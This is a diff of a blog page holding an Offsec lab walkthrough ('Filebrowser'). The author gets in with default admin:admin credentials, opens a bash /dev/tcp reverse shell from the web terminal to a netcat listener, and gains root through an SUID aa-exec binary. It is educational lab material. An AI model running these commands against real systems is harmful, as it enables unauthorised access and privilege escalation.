@@ -2,193 +2,178 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <!-- SEO -->
-    <title>[LAB NAME] - [Platform] - Writeup</title>
-    <meta name="description" content="[Short description of the lab and techniques used]">
-    <meta name="keywords" content="pentesting, writeup, CTF, OSCP, [techniques]">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Offensive security writeups, penetration testing labs, and CTF walkthroughs focused on web, network, and privilege escalation techniques.">
+    <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe writeups, HackTheBox, CTF, cybersecurity, ethical hacking">
     <meta name="author" content="xlondra">
     <meta name="robots" content="index, follow">
-
-    <!-- OpenGraph -->
-    <meta property="og:title" content="[LAB NAME] Writeup">
-    <meta property="og:description" content="[Short description]">
-    <meta property="og:type" content="article">
+    <meta property="og:title" content="Pentest Writeups & Security Notes">
+    <meta property="og:description" content="Offensive security lab writeups and CTF walkthroughs.">
+    <meta property="og:type" content="website">
     <meta property="og:url" content="https://xlondra.github.io">
+    <title>Filebrowser - Offsec - Walktrough</title>
     
-    <!-- CSS -->
     <link rel="stylesheet" href="../../../assets/css/writeup.css">
     <link rel="stylesheet" href="../../../assets/css/global.css">
     <link rel="stylesheet" href="../../../assets/css/index.css">
     <link rel="stylesheet" href="../../../assets/css/code.css">
     <link rel="stylesheet" href="../../../assets/css/explain.css">
 
-    <!-- JS -->
     <script src="../../../assets/js/nav.js" defer></script>
     <script src="../../../assets/js/footer.js" defer></script>
     <script src="../../../assets/js/zoomer.js" defer></script>
     <script src="../../../assets/js/writeup.js" defer></script>
 </head>
-
 <body>
+    <header>
+        <nav>
+            <div class="terminal">
+                <span class="prompt">londra@kali $> </span>
+                <span class="typed"></span><span class="cursor">_</span>
+            </div>
+            <div class="nav hidden">
+                <a href="../../../index.html">Home</a>
+                <a href="../../../writeuplist.html">Writeups</a>
+                <a href="../../../tools.html">Tools</a>
+                <a href="../../../contact.html">Contact</a>
+            </div>
+            <div class="hamburger-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor"><path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/></svg></div>
+        </nav>
+    </header>
 
-<header>
-    <nav>
-        <div class="terminal">
-            <span class="prompt">londra@kali $> </span>
-            <span class="typed"></span><span class="cursor">_</span>
-        </div>
+    <main>
+        <article class="writeup">
+            <div class="lab-header">
+                <h1 class="lab-title">Offsec - Filebrowser - Walktrough</h1>
 
-        <div class="nav hidden">
-            <a href="../../../index.html">Home</a>
-            <a href="../../../writeuplist.html">Writeups</a>
-            <a href="../../../tools.html">Tools</a>
-            <a href="../../../contact.html">Contact</a>
-        </div>
-
-        <div class="hamburger-button">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor">
-                <path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/>
-            </svg>
-        </div>
-    </nav>
-</header>
-
-<main>
-    <article class="writeup">
-        <header class="lab-header">
-            <h1 class="lab-title">Offsec - Filebrowser - Writeup</h1>
-
-            <ul class="lab-meta">
-                <li><strong>Date:</strong> 2026-03-22</li>
-                <li><strong>Platform:</strong> Offsec</li>
-                <li><strong>Difficulty:</strong> Medium</li>
-                <li><strong>Link:</strong> <a href="https://portal.offsec.com/machine/filebrowser-213910" target="_blank" rel="noopener noreferrer">Open Lab</a></li>
-                <li><strong>Tags:</strong>
-                    <span class="tag">RCE</span>
-                    <span class="tag">SUID</span>
-                </li>
-            </ul>
-        </header>
-
-        <!-- RECON -->
-        <section class="writeup-section">
-            <h2 class="section-title">Reconnaissance</h2>
-
-            <p>First I add the machine ip to <b>/etc/hosts</b> under the name <b>filebrowser</b></p>
-
-            <p>Let's start with an nmap scan</p>
-
-            <img src="images/nmap1.png" class="lab-image zoomable">
-
-            <div class="command-wrapper">
-                <pre><code data-copy-content="sudo nmap -p- 192.168.212.176">└─$ sudo nmap -p- 192.168.212.176</code></pre>
+                <ul class="lab-meta">
+                    <li><strong>Date:</strong> 2026-03-22</li>
+                    <li><strong>Platform:</strong> Offsec</li>
+                    <li><strong>Difficulty:</strong> Medium</li>
+                    <li><strong>Link:</strong> <a href="https://portal.offsec.com/machine/filebrowser-213910" target="_blank" rel="noopener noreferrer">Open Lab</a></li>
+                    <li><strong>Tags:</strong>
+                        <span class="tag">RCE</span>
+                        <span class="tag">SUID</span>
+                    </li>
+                </ul>
             </div>
 
-            <p>A service scan would be unnecessary here because visiting the ip on port 8080 in the brower reveals a login page</p>
-            <img src="images/port8080.png" class="lab-image zoomable">
-        </section>
+            <!-- RECON -->
+            <section class="writeup-section">
+                <h2 class="section-title">Reconnaissance</h2>
 
-        <!-- ENUM -->
-        <section class="writeup-section">
-            <h2 class="section-title">Enumeration</h2>
+                <p>First I add the machine ip to <b>/etc/hosts</b> under the name <b>filebrowser</b></p>
 
-            <p>The first thing I tried was using the user:pass combination of <b>admin:admin</b><br>
-                Which let me in by suprise.
-            </p>
-            <img src="images/logedin.png" class="lab-image zoomable">
+                <p>Let's start with an nmap scan</p>
 
-            <p>Upon log in it seemed that I landed it someones home directory. Probably Linux<br>
-                I see a file called <b>local.txt</b> which looks like the flag.
-            </p>
+                <img src="images/nmap1.png" class="lab-image zoomable">
 
-            <img src="images/localflag.png" class="lab-image zoomable">
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="sudo nmap -p- 192.168.212.176">└─$ sudo nmap -p- 192.168.212.176</code></pre>
+                </div>
 
-            <p>I opened the file and it indeed contained the first flag</p>
-            <img src="images/flag1.png" class="lab-image zoomable">
+                <p>A service scan would be unnecessary here because visiting the ip on port 8080 in the brower reveals a login page</p>
+                <img src="images/port8080.png" class="lab-image zoomable">
+            </section>
 
-            <p>I noticed the following icon at the top of the page: "&lt;&gt;"<br>
-                I clicked on it, it revealed a terminal:
-            </p>
+            <!-- ENUM -->
+            <section class="writeup-section">
+                <h2 class="section-title">Enumeration</h2>
 
-            <img src="images/commandProof.png" class="lab-image zoomable">
-            <p>"Command now allowed", I went to <b>Settings</b> -> <b>Global Settings</b><br>
-                I could define allowed commands there:
-            </p>
-            <img src="images/allowedAdded.png" class="lab-image zoomable">
+                <p>The first thing I tried was using the user:pass combination of <b>admin:admin</b><br>
+                    Which let me in by suprise.
+                </p>
+                <img src="images/logedin.png" class="lab-image zoomable">
 
-            <p>
-                Adding these commands didn't work for the current user.<br>
-                So I headed to <b>Settings</b> -> <b>User Management</b> and created a new user<br>
-                Here, I could also add allowed commands for that specific user, and so I did:
-            </p>
+                <p>Upon log in it seemed that I landed it someones home directory. Probably Linux<br>
+                    I see a file called <b>local.txt</b> which looks like the flag.
+                </p>
 
-            <ul>
-                <li>Username: Londra</li>
-                <li>Password: 1234</li>
-                <li>Scope: .</li>
-                <li>Administrator: check</li>
-                <li>Commands: bash id</li>
-            </ul>
-            <p></p>
-            <p>I then logged in as the new user, before executing the command I first started a netcat listener:
-            </p>
-            <div class="command-wrapper">
-                <pre><code data-copy-content="nc -nvlp 4444">└─$ nc -nvlp 4444</code></pre>
-            </div>    
-            <p>Then I executed the following command in the web terminal:</p>  
+                <img src="images/localflag.png" class="lab-image zoomable">
+
+                <p>I opened the file and it indeed contained the first flag</p>
+                <img src="images/flag1.png" class="lab-image zoomable">
+
+                <p>I noticed the following icon at the top of the page: "&lt;&gt;"<br>
+                    I clicked on it, it revealed a terminal:
+                </p>
+
+                <img src="images/commandProof.png" class="lab-image zoomable">
+                <p>"Command now allowed", I went to <b>Settings</b> -> <b>Global Settings</b><br>
+                    I could define allowed commands there:
+                </p>
+                <img src="images/allowedAdded.png" class="lab-image zoomable">
+
+                <p>
+                    Adding these commands didn't work for the current user.<br>
+                    So I headed to <b>Settings</b> -> <b>User Management</b> and created a new user<br>
+                    Here, I could also add allowed commands for that specific user, and so I did:
+                </p>
+
+                <ul>
+                    <li>Username: Londra</li>
+                    <li>Password: 1234</li>
+                    <li>Scope: .</li>
+                    <li>Administrator: check</li>
+                    <li>Commands: bash id</li>
+                </ul>
+                <p></p>
+                <p>I then logged in as the new user, before executing the command I first started a netcat listener:
+                </p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="nc -nvlp 4444">└─$ nc -nvlp 4444</code></pre>
+                </div>    
+                <p>Then I executed the following command in the web terminal:</p>  
+                
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="bash -c 'bash -i &gt;& /dev/tcp/IP/4444 0&gt;&1'">bash -c 'bash -i &gt;& /dev/tcp/IP/4444 0&gt;&1'</code></pre>
+                </div>   
+                
+                <p>This executed successfully and resulted in a reverse shell:</p>
+                <img src="images/revshell.png" class="lab-image zoomable">
+            </section>
+
+            <!-- EXPLOIT -->
+            <section class="writeup-section">
+                <h2 class="section-title">Exploitation</h2>
+
+                <p>We are logged in as user <b>david</b>, we thus have to escalate privileges<br>
+                    One of the first things I normally do is searching for <b>SUID</b> binaries<br>
+                    I did so in this room as well, I executed the following command inside the reverse shell:
+                </p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="find / -type f -perm -04000 -ls 2>/dev/null">find / -type f -perm -04000 -ls 2>/dev/null</code></pre>
+                </div>
+
+                <p>I found the following:</p>
+                <img src="images/findSUID.png" class="lab-image zoomable">
+                <p>aa-exec is a Linux utility used to run a program under a specific AppArmor security profile.
+                AppArmor is a kernel security system that restricts what a program is allowed to do (files it can read, commands it can run, network access, etc.). Think of it like a “permission cage” around processes. </p>
             
-            <div class="command-wrapper">
-                <pre><code data-copy-content="bash -c 'bash -i &gt;& /dev/tcp/IP/4444 0&gt;&1'">bash -c 'bash -i &gt;& /dev/tcp/IP/4444 0&gt;&1'</code></pre>
-            </div>   
-            
-            <p>This executed successfully and resulted in a reverse shell:</p>
-            <img src="images/revshell.png" class="lab-image zoomable">
-        </section>
+                <p>Since this binary is owned by root and the sticky bit is set (SUID), we can execute <b>aa-exec</b> as root.<br>
+                I crafted the following command to extract the root flag:</p>
 
-        <!-- EXPLOIT -->
-        <section class="writeup-section">
-            <h2 class="section-title">Exploitation</h2>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="aa-exec -p unconfined -- /bin/bash -p">aa-exec -p unconfined -- /bin/bash -p</code></pre>
+                </div>
 
-            <p>We are logged in as user <b>david</b>, we thus have to escalate privileges<br>
-                One of the first things I normally do is searching for <b>SUID</b> binaries<br>
-                I did so in this room as well, I executed the following command inside the reverse shell:
-            </p>
+                <p>And with success:</p>
+                <img src="images/whoamiRoot.png" class="lab-image zoomable">
 
-            <div class="command-wrapper">
-                <pre><code data-copy-content="find / -type f -perm -04000 -ls 2>/dev/null">find / -type f -perm -04000 -ls 2>/dev/null</code></pre>
-            </div>
+                <p>Now let's read the root flag</p>
+                <img src="images/rootflag.png" class="lab-image zoomable">
 
-            <p>I found the following:</p>
-            <img src="images/findSUID.png" class="lab-image zoomable">
-            <p>aa-exec is a Linux utility used to run a program under a specific AppArmor security profile.
-            AppArmor is a kernel security system that restricts what a program is allowed to do (files it can read, commands it can run, network access, etc.). Think of it like a “permission cage” around processes. </p>
-        
-            <p>Since this binary is owned by root and the sticky bit is set (SUID), we can execute <b>aa-exec</b> as root.<br>
-            I crafted the following command to extract the root flag:</p>
+                <p>That's it, we got the root flag.</p>
 
-            <div class="command-wrapper">
-                <pre><code data-copy-content="aa-exec -p unconfined -- /bin/bash -p">aa-exec -p unconfined -- /bin/bash -p</code></pre>
-            </div>
+                <p>This was a relatively short room, but I enjoyed it.<br>
+                I hope you did too, have a nice rest of your day :)</p>
+            </section>
+        </article>
+    </main>
 
-            <p>And with success:</p>
-            <img src="images/whoamiRoot.png" class="lab-image zoomable">
-
-            <p>Now let's read the root flag</p>
-            <img src="images/rootflag.png" class="lab-image zoomable">
-
-            <p>That's it, we got the root flag.</p>
-
-            <p>This was a relatively short room, but I enjoyed it.<br>
-            I hope you did too, have a nice rest of your day :)</p>
-        </section>
-    </article>
-</main>
-
-<footer>
-    Copyleft &copy; <span id="year"></span>
-</footer>
-
+    <footer>
+        Copyleft &copy; <span id="year"></span>
+    </footer>
 </body>
 </html>
